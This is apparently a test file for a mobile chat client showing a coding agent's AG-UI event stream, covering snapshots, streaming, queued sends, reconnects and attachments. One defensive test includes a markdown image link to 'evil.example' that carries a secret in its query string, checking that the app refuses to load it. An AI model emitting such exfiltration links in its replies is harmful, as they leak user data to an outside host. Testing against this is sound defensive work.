// The app against a scripted server (test/fixture.ts): what a phone shows as the server's AG-UI
// events arrive, and what it sends back.
import { EventType } from "@ag-ui/core";
import { afterEach, beforeEach, expect, test } from "bun:test";
import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { App } from "./app";
import type { Uploader } from "./lib/attach";
import { openLink } from "./lib/connection";
import type { Inbound } from "./lib/protocol";
import { makeSession } from "./lib/session";
import { ack, type Entry, fakeServer, IDLE, parseSent, said, snapshot, state } from "./test/fixture";
import type { Asset } from "@wire";
import { Schema } from "effect";

const LOG: Entry[] = [
  { kind: "user", text: "what is in the repo?" },
  { kind: "tool", text: 'Bash {"command":"ls"}' },
  { kind: "echo", text: "notes.md\nrepo" },
  { kind: "talk", text: "Two things: **notes** and a repo." },
];

const DEVICES = [
  { claudeVersion: "2.1.289", folders: ["~/repos"], local: true, name: "mini", status: "online", url: "http://optchat-mini:7710" },
  { claudeVersion: null, folders: ["~/repos"], local: false, name: "macbook", status: "offline", url: "http://optchat-macbook:7710" },
];

const realFetch = globalThis.fetch;
beforeEach(() => {
  globalThis.fetch = Object.assign(async (input: string | URL | Request) => {
    const path = new URL(input instanceof Request ? input.url : input, "http://127.0.0.1:7700/").pathname;
    if (path === "/api/devices") return Response.json(DEVICES);
    if (path === "/api/messages") {
      // the page before message 100 of a long log: two entries are enough
      const entries = [98, 99].map((i) => ({ date: "2026-10-05T10:00:00Z", i, kind: "user", text: `older message ${i}` }));
      return Response.json({ entries, total: 104 });
    }
    return Response.json({ error: "not in this test" }, { status: 404 });
  }, { preconnect: realFetch.preconnect });
});
afterEach(() => {
  globalThis.fetch = realFetch;
});

function start(log: readonly Entry[] = LOG, from = 0, uploader?: Uploader) {
  let entries = [...log];
  const greeting = (): Inbound[] => [snapshot(entries, from), { snapshot: { ...IDLE, messages: from + entries.length }, type: EventType.STATE_SNAPSHOT }];
  const server = fakeServer(greeting);
  const link = openLink("ws://127.0.0.1:7700/ws", { retryMs: 1, socket: server.socket });
  const session = makeSession(link);
  render(<App link={link} session={session} uploader={uploader} />);
  const play = (...events: Inbound[]) => {
    act(() => {
      server.play(...events);
    });
  };
  return {
    log: (more: readonly Entry[]) => {
      entries = [...entries, ...more];
    },
    play,
    server,
  };
}

const sentTexts = (sent: readonly string[]) =>
  sent.flatMap((f) => {
    const frame = parseSent(f);
    return frame.messages ? [{ device: frame.forwardedProps?.device, text: frame.messages.at(-1)?.content }] : [];
  });
// the id the newest message went out with, which the server's ack names
const lastId = (sent: readonly string[]) =>
  sent.flatMap((f) => parseSent(f).messages?.at(-1)?.id ?? []).at(-1) ?? "";

test("the snapshot shows the log: messages, a collapsed tool call, markdown with a raw-text toggle", async () => {
  start();
  await screen.findByText("what is in the repo?");
  expect(screen.getByText(/^Bash/)).toBeTruthy();
  expect(screen.getByText("Completed")).toBeTruthy();
  fireEvent.click(screen.getByText(/^Bash/));
  const output = await screen.findByText(/notes\.md/);
  expect(output.textContent).toContain("repo");
  await screen.findByText("notes"); // rendered: the asterisks are markup
  expect(screen.queryByText(/\*\*notes\*\*/)).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Show raw text" }));
  expect(screen.getByText("Two things: **notes** and a repo.")).toBeTruthy();
});

test("a turn another client started streams in, with its status line", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "sent from the laptop"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ engine: "claude-code:opus", phase: "running" }));
  expect(await screen.findByText("sent from the laptop")).toBeTruthy();
  expect(screen.getByTestId("status").textContent).toContain("running on mini (claude-code:opus)");
  play({ name: "thinking", type: EventType.CUSTOM, value: { tokens: 12 } });
  expect(screen.getByTestId("status").textContent).toContain("thinking…");
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Half a ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Half a/);
  expect(screen.getByTestId("status").textContent).not.toContain("thinking");
  play({ delta: "reply.", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT }, { messageId: "5", type: EventType.TEXT_MESSAGE_END });
  await screen.findByText("Half a reply.");
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, state({ engine: null, phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByTestId("status")).toBeNull();
  });
});

test("sending: the message goes out with the picked device and waits in the queue until it is logged; stop aborts", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const device = await screen.findByLabelText("Device");
  fireEvent.change(device, { target: { value: "macbook" } });
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "and now?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  expect(sentTexts(server.sent)).toEqual([{ device: "macbook", text: "and now?" }]);
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("and now?")).toBeTruthy();

  play(state({ phase: "running" }), ack(lastId(server.sent), 4), ...said(4, "user", "and now?"));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  fireEvent.click(screen.getByRole("button", { name: "Stop" }));
  expect(server.sent.at(-1)).toBe('{"type":"abort"}');
});

test("a message the log refused stays in the queue, marked not logged with the error", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "will it stick?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  play(ack(lastId(server.sent), null, "no space left"));
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("will it stick?")).toBeTruthy();
  expect(within(queue).getByTestId("queue-error").textContent).toBe("not logged: no space left");
});

test("info and errors show as markers in the chat", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play({ name: "info", type: EventType.CUSTOM, value: "cancelled" }, { message: "usage limit: try later", type: EventType.RUN_ERROR });
  const marker = await screen.findByTestId("marker-info");
  expect(marker.textContent).toContain("cancelled");
  expect(screen.getByRole("alert").textContent).toContain("usage limit: try later");
});

test("older entries are prepended from /api/messages", async () => {
  start(LOG, 100);
  await screen.findByText("what is in the repo?");
  fireEvent.click(screen.getByRole("button", { name: "earlier messages" }));
  await screen.findByText("older message 99");
  const texts = screen.getAllByTestId("user-message").map((m) => m.textContent);
  expect(texts).toEqual(["older message 98", "older message 99", "what is in the repo?"]);
});

test("after a reconnect the chat is rebuilt from the new snapshot, without duplicates", async () => {
  const { log, play, server } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "one more"));
  await screen.findByText("one more");
  log([{ kind: "user", text: "one more" }, { kind: "talk", text: "logged while away" }]);
  act(() => {
    server.drop();
  });
  await screen.findByText("logged while away");
  expect(screen.getAllByText("one more")).toHaveLength(1);
  expect(screen.getAllByText("what is in the repo?")).toHaveLength(1);
  expect(screen.getByRole("img", { name: "connection open" })).toBeTruthy();
});

test("a tool row opened mid-turn stays open as the turn goes on and the run's snapshot lands", async () => {
  const { log, play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "look again"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play(
    { parentMessageId: "5", toolCallId: "t5", toolCallName: "Read", type: EventType.TOOL_CALL_START },
    { delta: '{"file_path":"notes.md"}', toolCallId: "t5", type: EventType.TOOL_CALL_ARGS },
    { toolCallId: "t5", type: EventType.TOOL_CALL_END },
  );
  fireEvent.click(await screen.findByText(/^Read/));
  await screen.findByText(/"file_path":"notes\.md"/); // the input as logged, not re-serialised
  play({ content: "# notes", messageId: "6", role: "tool", toolCallId: "t5", type: EventType.TOOL_CALL_RESULT }, ...said(7, "assistant", "It has notes."));
  log([
    { kind: "user", text: "look again" },
    { kind: "tool", text: 'Read {"file_path":"notes.md"}' },
    { kind: "echo", text: "# notes" },
    { kind: "talk", text: "It has notes." },
  ]);
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, snapshot([...LOG, { kind: "user", text: "look again" }, { kind: "tool", text: 'Read {"file_path":"notes.md"}' }, { kind: "echo", text: "# notes" }, { kind: "talk", text: "It has notes." }]), state({ phase: "idle" }));
  await screen.findByText("It has notes.");
  expect(screen.getByText(/"file_path":"notes\.md"/)).toBeTruthy(); // still open
  expect(screen.getByText("# notes")).toBeTruthy();
  const rows = [...document.querySelectorAll<HTMLElement>("[data-log-index]")].map((e) => e.dataset.logIndex);
  expect(rows).toEqual(["0", "1", "3", "4", "5", "7"]);
});

test("cancelling, then sending: the new message gets its own bubble", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "cancel me"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Streamed ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Streamed/);
  play({ messageId: "5", type: EventType.TEXT_MESSAGE_END }, { message: "cancelled", type: EventType.RUN_ERROR }, snapshot([...LOG, { kind: "user", text: "cancel me" }]), state({ phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByText(/Streamed/)).toBeNull();
  });
  play(...said(5, "user", "AFTER CANCEL"));
  const bubble = await screen.findByText("AFTER CANCEL");
  expect(bubble.closest("[data-testid=user-message]")?.textContent).toBe("AFTER CANCEL");
});

test("on a touch screen Enter is a new line and the send button sends the text as typed", async () => {
  const realMatch = globalThis.matchMedia;
  globalThis.matchMedia = (query: string) => {
    const list = realMatch(query);
    Object.defineProperty(list, "matches", { value: query === "(pointer: coarse)" });
    return list;
  };
  try {
    const { server } = start();
    await screen.findByText("what is in the repo?");
    const box = screen.getByLabelText("Message");
    fireEvent.change(box, { target: { value: "  two\nlines  " } });
    fireEvent.keyDown(box, { key: "Enter" });
    expect(sentTexts(server.sent)).toEqual([]);
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "  two\nlines  " }]);
    fireEvent.change(box, { target: { value: " \n " } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toHaveLength(1); // a blank message isn't sent
  } finally {
    globalThis.matchMedia = realMatch;
  }
});

test("a reply's markdown never loads an image", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "assistant", "look: ![tracker](https://evil.example/p.png?d=secret) and ![d](data:image/png;base64,AAAA)"));
  await screen.findByText(/look:/);
  await new Promise((resolve) => {
    setTimeout(resolve, 50);
  });
  expect(document.querySelectorAll("img")).toHaveLength(0);
  expect(document.body.innerHTML).not.toContain("evil.example/p.png");
});

// ---------------------------------------------------------------------------------------------
// attachments (SPEC "Media")

// an upload that finishes when the test says: each one as asked for, its progress and its end
const fakeUploads = () => {
  const started: { body: Blob; progress: (f: number) => void; finish: (sha: string) => void; fail: (why: string) => void }[] = [];
  const uploader: Uploader = (body, progress) => {
    const { promise, reject, resolve } = Promise.withResolvers<Asset>();
    const fail = (why: string) => {
      reject(new Error(why));
    };
    const finish = (sha: string) => {
      resolve({ bytes: 2048, height: 600, kind: "image", mime: "image/jpeg", sha, width: 800 });
    };
    started.push({ body, fail, finish, progress });
    return {
      abort: () => {
        fail("upload cancelled");
      },
      done: promise,
    };
  };
  return { started, uploader };
};
const SHA = (c: string) => c.repeat(64);
const png = (name: string) => new File([new Uint8Array([0x89, 0x50, 0x4E, 0x47])], name, { type: "image/png" });
const filesOf = (...files: File[]) => {
  const dt = new DataTransfer();
  for (const f of files) dt.items.add(f);
  return dt.files;
};
const Parts = Schema.Array(Schema.Struct({ type: Schema.String, text: Schema.optional(Schema.String), source: Schema.optional(Schema.Struct({ type: Schema.String, value: Schema.String })) }));

test("attach, paste and drop fill the tray; send waits for the uploads, names each by digest, and the logged message shows its thumbnails", async () => {
  const uploads = fakeUploads();
  const { play, server } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const send = screen.getByRole("button", { name: "Send" });
  expect(send.hasAttribute("disabled")).toBe(true); // nothing to send yet

  // the picker, a paste, a drop
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  fireEvent.paste(screen.getByLabelText("Message"), { clipboardData: { files: filesOf(png("")), types: ["Files"] } });
  fireEvent.drop(screen.getByLabelText("Message"), { dataTransfer: { files: filesOf(png("dropped.png")), types: ["Files"] } });
  await waitFor(() => {
    expect(uploads.started).toHaveLength(3);
  });
  const tray = screen.getByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment").map((a) => a.dataset.state)).toEqual(["uploading", "uploading", "uploading"]);
  expect(within(tray).getByAltText("pasted image")).toBeTruthy();
  act(() => {
    uploads.started[0]?.progress(0.5);
  });
  expect(within(tray).getByLabelText("Uploading board.png")).toBeTruthy();

  // one fails: it says why and holds the message back until it is removed
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
    uploads.started[1]?.finish(SHA("b"));
    uploads.started[2]?.fail("not an image or video this server takes");
  });
  expect(within(tray).getByRole("alert").textContent).toBe("not an image or video this server takes");
  expect(send.hasAttribute("disabled")).toBe(true);
  fireEvent.click(within(tray).getByLabelText("Remove dropped.png"));
  expect(send.hasAttribute("disabled")).toBe(false); // attachments alone are enough
  fireEvent.click(send);

  const frame = parseSent(server.sent.at(-1) ?? "");
  const parts = Schema.decodeUnknownSync(Parts)(frame.messages?.at(-1)?.content);
  expect(parts).toEqual([
    { text: "", type: "text" },
    { source: { type: "url", value: `asset:${SHA("a")}` }, type: "image" },
    { source: { type: "url", value: `asset:${SHA("b")}` }, type: "image" },
  ]);
  expect(screen.queryByTestId("attachments")).toBeNull(); // the tray is empty again
  expect(within(await screen.findByTestId("queue")).getByText("+ 2 attachments")).toBeTruthy();

  // logged: the markers, as the server writes them; thumbnails from our own /api/assets
  const markers = `[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]\n[image bbbbbbbbbbbb 800x600 2KB: (not described)]`;
  play(ack(lastId(server.sent), 4), ...said(4, "user", markers));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  const row = screen.getAllByTestId("user-message").at(-1);
  const thumbs = within(row ?? document.body).getAllByRole("img");
  expect(thumbs.map((t) => t.getAttribute("src"))).toEqual(["/api/assets/aaaaaaaaaaaa/thumb", "/api/assets/bbbbbbbbbbbb/thumb"]);
  expect(row?.textContent).toContain("[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]");
});

test("a fifth attachment is refused in the tray, and a reply's marker-like text never loads a thumbnail", async () => {
  const uploads = fakeUploads();
  const { play } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(...["1", "2", "3", "4", "5"].map((n) => png(`${n}.png`))) });
  fireEvent.change(picker);
  const tray = await screen.findByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment")).toHaveLength(4);
  expect(within(tray).getByRole("alert").textContent).toBe("at most 4 attachments per message");
  play(...said(4, "assistant", "[image aaaaaaaaaaaa 800x600 2KB: a trap]"));
  await screen.findByText(/a trap/);
  expect(document.querySelectorAll('img[src^="/api/assets/"]')).toHaveLength(0);
});
